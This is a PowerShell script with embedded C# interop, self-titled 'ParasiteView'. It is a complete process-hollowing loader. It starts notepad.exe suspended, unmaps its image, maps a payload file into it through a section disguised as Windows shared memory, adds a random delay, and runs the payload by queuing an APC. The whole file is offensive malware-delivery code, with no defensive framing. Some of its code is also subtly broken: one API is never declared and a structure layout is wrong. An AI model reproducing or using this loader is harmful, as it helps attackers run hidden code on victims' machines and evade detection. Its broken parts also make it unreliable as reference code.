Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

[StructLayout(LayoutKind.Sequential)]
public struct CONTEXT64 {
    public ulong P1Home, P2Home, P3Home, P4Home, P5Home, P6Home;
    public uint ContextFlags;
    public uint MxCsr;
    public ushort SegCs, SegDs, SegEs, SegFs, SegGs, SegSs, EFlags;
    public ulong Dr0, Dr1, Dr2, Dr3, Dr6, Dr7;
    public ulong Rax, Rcx, Rdx, Rbx, Rsp, Rbp, Rsi, Rdi;
    public ulong R8, R9, R10, R11, R12, R13, R14, R15;
    public ulong Rip;
}

public static class NtNative {
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateSection(
        out IntPtr SectionHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        ref ulong SectionSize,
        uint SectionPageProtection,
        uint AllocationAttributes,
        IntPtr FileHandle
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtMapViewOfSection(
        IntPtr SectionHandle,
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        UIntPtr ZeroBits,
        UIntPtr CommitSize,
        IntPtr SectionOffset,
        ref ulong ViewSize,
        uint InheritDisposition,
        uint AllocationType,
        uint Win32Protect
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtUnmapViewOfSection(
        IntPtr ProcessHandle,
        IntPtr BaseAddress
    );

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFOEX si,
        out PROCESS_INFORMATION pi
    );

    [DllImport("ntdll.dll")]
    public static extern uint NtQueueApcThread(
        IntPtr ThreadHandle,
        IntPtr ApcRoutine,
        IntPtr ApcArgument1,
        IntPtr ApcArgument2,
        IntPtr ApcArgument3
    );

    [DllImport("kernel32.dll")]
    public static extern uint ResumeThread(IntPtr hThread);

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION {
        public IntPtr hProcess, hThread;
        public uint dwProcessId, dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFOEX {
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX, dwY, dwXSize, dwYSize, dwXCountChars, dwYCountChars, dwFillAttribute;
        public uint dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput, hStdOutput, hStdError;
        public IntPtr lpAttributeList;
    }
}
"@

# CONFIG
$payloadPath = "payload.exe"
$targetBinary = "C:\\Windows\\System32\\notepad.exe"
$secSize = [ulong]0x200000
$sectionName = "\BaseNamedObjects\Windows_SharedMemory_" + (Get-Random -Minimum 1000 -Maximum 9999)

# VALIDATE PAYLOAD
if (-not (Test-Path $payloadPath)) { throw "Payload not found: $payloadPath" }
$payload = [IO.File]::ReadAllBytes($payloadPath)
if ($payload.Length -gt $secSize) { throw "Payload too large. Max allowed: $secSize bytes" }

# Parse EntryPoint
$e_lfanew = [BitConverter]::ToInt32($payload, 0x3C)
$entryOffset = $e_lfanew + 0x28
$entryPoint = [BitConverter]::ToInt32($payload, $entryOffset)
Write-Host "[*] EntryPoint offset in payload.exe: 0x$("{0:X}" -f $entryPoint)"

# 1. Create named section
$unicodeName = [System.Text.Encoding]::Unicode.GetBytes($sectionName + "`0")
$ptrName = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($unicodeName.Length)
[System.Runtime.InteropServices.Marshal]::Copy($unicodeName, 0, $ptrName, $unicodeName.Length)

$objectAttributes = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(24)
[System.Runtime.InteropServices.Marshal]::WriteInt32($objectAttributes, 0, 24)  # Length
[System.Runtime.InteropServices.Marshal]::WriteIntPtr($objectAttributes, 8, $ptrName)  # Name

[int]$status = [NtNative]::NtCreateSection([ref]$hSection, 0xF001F, $objectAttributes, [ref]$secSize, 0x04, 0x8000000, [IntPtr]::Zero)
if ($status -ne 0) { throw "NtCreateSection failed: 0x$("{0:X}" -f $status)" }

# 2. Map into local process
$localBase = [IntPtr]::Zero
$viewSize = $secSize
$status = [NtNative]::NtMapViewOfSection($hSection, (Get-Process -id $PID).Handle, [ref]$localBase, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 2, 0, 0x04)
if ($status -ne 0) { throw "NtMapView (self) failed: 0x$("{0:X}" -f $status)" }
[System.Runtime.InteropServices.Marshal]::Copy($payload, 0, $localBase, $payload.Length)

# 3. Launch target suspended
$si = New-Object NtNative+STARTUPINFOEX
$pi = New-Object NtNative+PROCESS_INFORMATION
if (-not [NtNative]::CreateProcess($targetBinary, $null, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x4, [IntPtr]::Zero, $null, [ref]$si, [ref]$pi)) {
    throw "CreateProcess failed: $([System.Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

# 4. Get ImageBase from context (Rdx)
$ctx = New-Object CONTEXT64
$ctx.ContextFlags = 0x100010
[NtNative]::GetThreadContext($pi.hThread, [ref]$ctx)
$imgBase = [IntPtr]::new([Int64]$ctx.Rdx)

# 5. Unmap original image
$status = [NtNative]::NtUnmapViewOfSection($pi.hProcess, $imgBase)
if ($status -ne 0) { throw "NtUnmapViewOfSection failed: 0x$("{0:X}" -f $status)" }

# 6. Random delay (3-10s)
$delay = Get-Random -Minimum 3000 -Maximum 10000
Write-Host "[*] Random delay: $($delay/1000) seconds"
Start-Sleep -Milliseconds $delay

# 7. Map into remote process
$remoteBase = $imgBase
$viewSize = $secSize
$status = [NtNative]::NtMapViewOfSection($hSection, $pi.hProcess, [ref]$remoteBase, [UIntPtr]::Zero, [UIntPtr]::Zero, [IntPtr]::Zero, [ref]$viewSize, 2, 0, 0x20)
if ($status -ne 0) { throw "NtMapView (remote) failed: 0x$("{0:X}" -f $status)" }

# 8. Queue APC to payload entrypoint
$apcRoutine = [IntPtr]::new([Int64]($remoteBase.ToInt64() + $entryPoint))
$status = [NtNative]::NtQueueApcThread($pi.hThread, $apcRoutine, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
if ($status -ne 0) { throw "NtQueueApcThread failed: 0x$("{0:X}" -f $status)" }
Write-Host "[*] APC queued to: 0x$("{0:X}" -f $apcRoutine.ToInt64())"

# 9. Resume thread
[NtNative]::ResumeThread($pi.hThread) | Out-Null
Write-Host "[+] ParasiteView: Payload ejecutado via APC en proceso $($pi.dwProcessId)"

# Cleanup
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($ptrName)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($objectAttributes)
